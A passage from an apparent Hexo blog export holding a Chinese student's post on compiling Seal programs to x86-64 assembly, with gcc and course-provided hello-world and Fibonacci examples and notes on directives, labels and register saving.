@function`\n\nGoogle了一下，`.rodata`代表了**常量区**，一般用于存放字符串常量，至于静态变量在不在这里，我也不知道，这个作业暂时不需要考虑。\n\n`.section`和`.type\tmain, @function`没查到有什么意义，但是大致知道了程序结构。程序的开头如下：\n\n```assembly\n\t.section\t\t.rodata\t\n.LC0:\n\t.string\t\"Hello world!\"\n```\n\n这一段存储字符串常量。\n\n从`.text`开始，就是程序的正文。对每个函数`f`，都有以下的结构：\n\n```assembly\n\t.globl\tf\n\t.type\tf, @function\nf:\n\t...\t//程序正文\n\t.size\tf, .-f\n```\n\n### 更加复杂的程序\n\nseal中内置了一个`printf`函数，来看一下是怎么用的。\n\n一个Fibonacci程序：\n\n```\nfunc fib(x Int) Int {\n    if x <= 2 {\n        return 1;\n    } \n\n    return fib(x-1) + fib(x-2);\n}\n\n\nfunc main() Void{\n    var i Int;\n    for i = 1;i < 15; i = i + 1 {\n        printf(\"fib(%lld) = %lld \\n\", i, fib(i));\n    }\n\n    return;\n}\n```\n\n转换后的汇编：\n\n```assembly\n# start of generated code\n\t.section\t\t.rodata\t\n.LC0:\n\t.string\t\"fib(%lld) = %lld \\n\"\n\t.text\t\n\t.globl\tfib\n\t.type\tfib, @function\nfib:\n\tpushq\t %rbp\n\tmovq\t%rsp, %rbp\n\tpushq\t %rbx\n\tpushq\t %r10\n\tpushq\t %r11\n\tpushq\t %r12\n\tpushq\t %r13\n\tpushq\t %r14\n\tpushq\t %r15\n\tsubq\t$8, %rsp\n\tmovq\t%rdi, -64(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t$2, %rax\n\tmovq\t%rax, -72(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-64(%rbp), %rax\n\tmovq\t-72(%rbp), %rdx\n\tcmpq\t%rdx, %rax\n\tjle\t .POS2\n\tmovq\t$0, %rax\n\tjmp\t .POS3\n.POS2:\n\tmovq\t$1, %rax\n.POS3:\n\tmovq\t%rax, -80(%rbp)\n\tmovq\t-80(%rbp), %rax\n\ttestq\t%rax, %rax\n\tjz\t .POS0\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -88(%rbp)\n\tmovq\t-88(%rbp), %rax\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\tjmp\t .POS1\n.POS0:\n.POS1:\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -96(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-64(%rbp), %rbx\n\tmovq\t-96(%rbp), %r10\n\tsubq\t%r10, %rbx\n\tmovq\t%rbx, -104(%rbp)\n\tmovq\t-104(%rbp), %rdi\n\tcall\t fib\n\tsubq\t$8, %rsp\n\tmovq\t%rax, -112(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t$2, %rax\n\tmovq\t%rax, -120(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-64(%rbp), %rbx\n\tmovq\t-120(%rbp), %r10\n\tsubq\t%r10, %rbx\n\tmovq\t%rbx, -128(%rbp)\n\tmovq\t-128(%rbp), %rdi\n\tcall\t fib\n\tsubq\t$8, %rsp\n\tmovq\t%rax, -136(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-112(%rbp), %rbx\n\tmovq\t-136(%rbp), %r10\n\taddq\t%rbx, %r10\n\tmovq\t%r10, -144(%rbp)\n\tmovq\t-144(%rbp), %rax\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\t.size\tfib, .-fib\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n\tpushq\t %rbp\n\tmovq\t%rsp, %rbp\n\tpushq\t %rbx\n\tpushq\t %r10\n\tpushq\t %r11\n\tpushq\t %r12\n\tpushq\t %r13\n\tpushq\t %r14\n\tpushq\t %r15\n\tsubq\t$8, %rsp\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -16(%rbp)\n\tmovq\t-16(%rbp), %rax\n\tmovq\t%rax, -8(%rbp)\n.POS4:\n\tsubq\t$8, %rsp\n\tmovq\t$15, %rax\n\tmovq\t%rax, -24(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-8(%rbp), %rax\n\tmovq\t-24(%rbp), %rdx\n\tcmpq\t%rdx, %rax\n\tjl\t .POS7\n\tmovq\t$0, %rax\n\tjmp\t .POS8\n.POS7:\n\tmovq\t$1, %rax\n.POS8:\n\tmovq\t%rax, -32(%rbp)\n\tmovq\t-32(%rbp), %rax\n\ttestq\t%rax, %rax\n\tjz\t .POS6\n\tsubq\t$8, %rsp\n\tmovq\t$.LC0, %rax\n\tmovq\t%rax, -40(%rbp)\n\tmovq\t-8(%rbp), %rdi\n\tcall\t fib\n\tsubq\t$8, %rsp\n\tmovq\t%rax, -48(%rbp)\n\tmovq\t-40(%rbp), %rdi\n\tmovq\t-8(%rbp), %rsi\n\tmovq\t-48(%rbp), %rdx\n\tsubq\t$8, %rsp\n\tmovl\t$0, %eax\n\tcall\t printf\n.POS5:\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -64(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-8(%rbp), %rbx\n\tmovq\t-64(%rbp), %r10\n\taddq\t%rbx, %r10\n\tmovq\t%r10, -72(%rbp)\n\tmovq\t-72(%rbp), %rax\n\tmovq\t%rax, -8(%rbp)\n\tjmp\t .POS4\n.POS6:\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\t.size\tmain, .-main\n\n# end of generated code\n\n```\n\n可以看到，程序的结构还是这样，只不过复杂的程序对应汇编代码正文比较长，但值得关注的是以下这行代码所对应的汇编语句：\n\n```\nprintf(\"fib(%lld) = %lld \\n\", i, fib(i));\n```\n\n首先，字符串`\"fib(%lld) = %lld \\n\"`是位于`.LC0`处的。把字符串的首地址存入内存\n\n```assembly\n\tsubq\t$8, %rsp\n\tmovq\t$.LC0, %rax\n\tmovq\t%rax, -40(%rbp)\n```\n\n然后运算了`fib(i)`，变量`i` 在`-8(%rbp)`内存中。\n\n```assembly\n\tmovq\t-8(%rbp), %rdi\n\tcall\t fib\n```\n\n`fib`返回之后将`%rax`中的值存入内存，再调用`printf`函数\n\n```assembly\n\tsubq\t$8, %rsp\t// 分配内存\n\tmovq\t%rax, -48(%rbp)\n\tmovq\t-40(%rbp), %rdi\t// 字符串\n\tmovq\t-8(%rbp), %rsi\t// i\n\tmovq\t-48(%rbp), %rdx\t// fib(i)\n\tsubq\t$8, %rsp\n\tmovl\t$0, %eax\n\tcall\tprintf\n```\n\n除了这个比较复杂的函数以外，其他都没什么问题，要注意一下**caller-saved register**和**callee-saved register**。","slug":"基于Seal语法树生成X86-64代码","published":1,"updated":"2020-12-28T07:08:16.168Z","_id":"ckiszi5ad000e98wa10qk7kgx","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"重新学习x86-64\"><a class=\"markdownIt-Anchor\" href=\"#重新学习x86-64\"></a> 重新学习x86-64</h1>\n<p>用gcc将以下代码翻译成x86-64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello world!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S test.c</span><br></pre></td></tr></table></figure>\n<p>得到如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.file\t&quot;test.c&quot;</span><br><span class=\"line\">\t.text</span><br><span class=\"line\">\t.section\t.rodata</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;hello world&quot;</span><br><span class=\"line\">\t.text</span><br><span class=\"line\">\t.globl\tmain</span><br><span class=\"line\">\t.type\tmain, @function</span><br><span class=\"line\">main:</span><br><span class=\"line\">.LFB0:</span><br><span class=\"line\">\t.cfi_startproc</span><br><span class=\"line\">\tpushq\t%rbp</span><br><span class=\"line\">\t.cfi_def_cfa_offset 16</span><br><span class=\"line\">\t.cfi_offset 6, -16</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\t.cfi_def_cfa_register 6</span><br><span class=\"line\">\tleaq\t.LC0(%rip), %rdi</span><br><span class=\"line\">\tcall\tputs@PLT</span><br><span class=\"line\">\tmovl\t$0, %eax</span><br><span class=\"line\">\tpopq\t%rbp</span><br><span class=\"line\">\t.cfi_def_cfa 7, 8</span><br><span class=\"line\">\tret</span><br><span class=\"line\">\t.cfi_endproc</span><br><span class=\"line\">.LFE0:</span><br><span class=\"line\">\t.size\tmain, .-main</span><br><span class=\"line\">\t.ident\t&quot;GCC: (GNU) 10.2.0&quot;</span><br><span class=\"line\">\t.section\t.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure>\n<h2 id=\"汇编程序的构成\"><a class=\"markdownIt-Anchor\" href=\"#汇编程序的构成\"></a> 汇编程序的构成</h2>\n<h3 id=\"指示-directives\"><a class=\"markdownIt-Anchor\" href=\"#指示-directives\"></a> 指示 (Directives)</h3>\n<p>以<strong>点号</strong>开始，用来<font color=red>指示结构信息</font>。本身不是汇编指令。</p>\n<p>比如：<code>.file</code>表示源文件名，<code>.string</code>表示字符串常量，<code>.global main</code>代表<strong>标签</strong>main是一个可以在其它模块的代码中被访问的全局符号 。还有一些杂七杂八的指示语句。</p>\n<h3 id=\"标签-labels\"><a class=\"markdownIt-Anchor\" href=\"#标签-labels\"></a> 标签 (Labels)</h3>\n<p>以<strong>冒号</strong>结尾，将标签名和标签的位置关联。</p>\n<p>以点号开始的标签都是编译器生成的临时局部标签，其它标签则是用户可见的函数和全局变量名称。</p>\n<h3 id=\"指令-instructions\"><a class=\"markdownIt-Anchor\" href=\"#指令-instructions\"></a> 指令 (Instructions)</h3>\n<p>就是普通的x86-64指令，一般有缩进。</p>\n<h2 id=\"从seal代码包给出的例子管中窥豹\"><a class=\"markdownIt-Anchor\" href=\"#从seal代码包给出的例子管中窥豹\"></a> 从Seal代码包给出的例子管中窥豹</h2>\n<p>不同的编译器翻译出来的汇编代码不一样，基本不是人读的。甚至不同的gcc版本都会翻译出不一样的代码。所以从助教给出的例子里找一找规律。</p>\n<h3 id=\"hello-world-程序\"><a class=\"markdownIt-Anchor\" href=\"#hello-world-程序\"></a> hello world 程序</h3>\n<p>一个是用seal写的hello world程序：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func main() Void&#123;</span><br><span class=\"line\">    printf(&quot;Hello world!&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    return;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对应的汇编：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># start of generated code</span><br><span class=\"line\">\t.section\t\t.rodata\t</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;Hello world!&quot;</span><br><span class=\"line\">\t.text\t</span><br><span class=\"line\">\t.globl\tmain</span><br><span class=\"line\">\t.type\tmain, @function</span><br><span class=\"line\">main:</span><br><span class=\"line\">\tpushq\t %rbp</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\tpushq\t %rbx</span><br><span class=\"line\">\tpushq\t %r10</span><br><span class=\"line\">\tpushq\t %r11</span><br><span class=\"line\">\tpushq\t %r12</span><br><span class=\"line\">\tpushq\t %r13</span><br><span class=\"line\">\tpushq\t %r14</span><br><span class=\"line\">\tpushq\t %r15</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$.LC0, %rax</span><br><span class=\"line\">\tmovq\t%rax, -64(%rbp)</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rdi</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovl\t$0, %eax</span><br><span class=\"line\">\tcall\t printf</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\t.size\tmain, .-main</span><br><span class=\"line\"></span><br><span class=\"line\"># end of generated code</span><br></pre></td></tr></table></figure>\n<p>首先能看到一些之前用C写的hello world编译出来的代码里看不到的一些指示语句。分别是：<code>.section</code>、<code>.rodata</code>和<code>.type\tmain, @function</code></p>\n<p>Google了一下，<code>.rodata</code>代表了<strong>常量区</strong>，一般用于存放字符串常量，至于静态变量在不在这里，我也不知道，这个作业暂时不需要考虑。</p>\n<p><code>.section</code>和<code>.type\tmain, @function</code>没查到有什么意义，但是大致知道了程序结构。程序的开头如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.section\t\t.rodata\t</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;Hello world!&quot;</span><br></pre></td></tr></table></figure>\n<p>这一段存储字符串常量。</p>\n<p>从<code>.text</code>开始，就是程序的正文。对每个函数<code>f</code>，都有以下的结构：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.globl\tf</span><br><span class=\"line\">\t.type\tf, @function</span><br><span class=\"line\">f:</span><br><span class=\"line\">\t...\t&#x2F;&#x2F;程序正文</span><br><span class=\"line\">\t.size\tf, .-f</span><br></pre></td></tr></table></figure>\n<h3 id=\"更加复杂的程序\"><a class=\"markdownIt-Anchor\" href=\"#更加复杂的程序\"></a> 更加复杂的程序</h3>\n<p>seal中内置了一个<code>printf</code>函数，来看一下是怎么用的。</p>\n<p>一个Fibonacci程序：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func fib(x Int) Int &#123;</span><br><span class=\"line\">    if x &lt;&#x3D; 2 &#123;</span><br><span class=\"line\">        return 1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    return fib(x-1) + fib(x-2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">func main() Void&#123;</span><br><span class=\"line\">    var i Int;</span><br><span class=\"line\">    for i &#x3D; 1;i &lt; 15; i &#x3D; i + 1 &#123;</span><br><span class=\"line\">        printf(&quot;fib(%lld) &#x3D; %lld \\n&quot;, i, fib(i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>转换后的汇编：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># start of generated code</span><br><span class=\"line\">\t.section\t\t.rodata\t</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;fib(%lld) &#x3D; %lld \\n&quot;</span><br><span class=\"line\">\t.text\t</span><br><span class=\"line\">\t.globl\tfib</span><br><span class=\"line\">\t.type\tfib, @function</span><br><span class=\"line\">fib:</span><br><span class=\"line\">\tpushq\t %rbp</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\tpushq\t %rbx</span><br><span class=\"line\">\tpushq\t %r10</span><br><span class=\"line\">\tpushq\t %r11</span><br><span class=\"line\">\tpushq\t %r12</span><br><span class=\"line\">\tpushq\t %r13</span><br><span class=\"line\">\tpushq\t %r14</span><br><span class=\"line\">\tpushq\t %r15</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rdi, -64(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$2, %rax</span><br><span class=\"line\">\tmovq\t%rax, -72(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rax</span><br><span class=\"line\">\tmovq\t-72(%rbp), %rdx</span><br><span class=\"line\">\tcmpq\t%rdx, %rax</span><br><span class=\"line\">\tjle\t .POS2</span><br><span class=\"line\">\tmovq\t$0, %rax</span><br><span class=\"line\">\tjmp\t .POS3</span><br><span class=\"line\">.POS2:</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">.POS3:</span><br><span class=\"line\">\tmovq\t%rax, -80(%rbp)</span><br><span class=\"line\">\tmovq\t-80(%rbp), %rax</span><br><span class=\"line\">\ttestq\t%rax, %rax</span><br><span class=\"line\">\tjz\t .POS0</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -88(%rbp)</span><br><span class=\"line\">\tmovq\t-88(%rbp), %rax</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\tjmp\t .POS1</span><br><span class=\"line\">.POS0:</span><br><span class=\"line\">.POS1:</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -96(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-96(%rbp), %r10</span><br><span class=\"line\">\tsubq\t%r10, %rbx</span><br><span class=\"line\">\tmovq\t%rbx, -104(%rbp)</span><br><span class=\"line\">\tmovq\t-104(%rbp), %rdi</span><br><span class=\"line\">\tcall\t fib</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rax, -112(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$2, %rax</span><br><span class=\"line\">\tmovq\t%rax, -120(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-120(%rbp), %r10</span><br><span class=\"line\">\tsubq\t%r10, %rbx</span><br><span class=\"line\">\tmovq\t%rbx, -128(%rbp)</span><br><span class=\"line\">\tmovq\t-128(%rbp), %rdi</span><br><span class=\"line\">\tcall\t fib</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rax, -136(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-112(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-136(%rbp), %r10</span><br><span class=\"line\">\taddq\t%rbx, %r10</span><br><span class=\"line\">\tmovq\t%r10, -144(%rbp)</span><br><span class=\"line\">\tmovq\t-144(%rbp), %rax</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\t.size\tfib, .-fib</span><br><span class=\"line\">\t.globl\tmain</span><br><span class=\"line\">\t.type\tmain, @function</span><br><span class=\"line\">main:</span><br><span class=\"line\">\tpushq\t %rbp</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\tpushq\t %rbx</span><br><span class=\"line\">\tpushq\t %r10</span><br><span class=\"line\">\tpushq\t %r11</span><br><span class=\"line\">\tpushq\t %r12</span><br><span class=\"line\">\tpushq\t %r13</span><br><span class=\"line\">\tpushq\t %r14</span><br><span class=\"line\">\tpushq\t %r15</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -16(%rbp)</span><br><span class=\"line\">\tmovq\t-16(%rbp), %rax</span><br><span class=\"line\">\tmovq\t%rax, -8(%rbp)</span><br><span class=\"line\">.POS4:</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$15, %rax</span><br><span class=\"line\">\tmovq\t%rax, -24(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rax</span><br><span class=\"line\">\tmovq\t-24(%rbp), %rdx</span><br><span class=\"line\">\tcmpq\t%rdx, %rax</span><br><span class=\"line\">\tjl\t .POS7</span><br><span class=\"line\">\tmovq\t$0, %rax</span><br><span class=\"line\">\tjmp\t .POS8</span><br><span class=\"line\">.POS7:</span><br><span 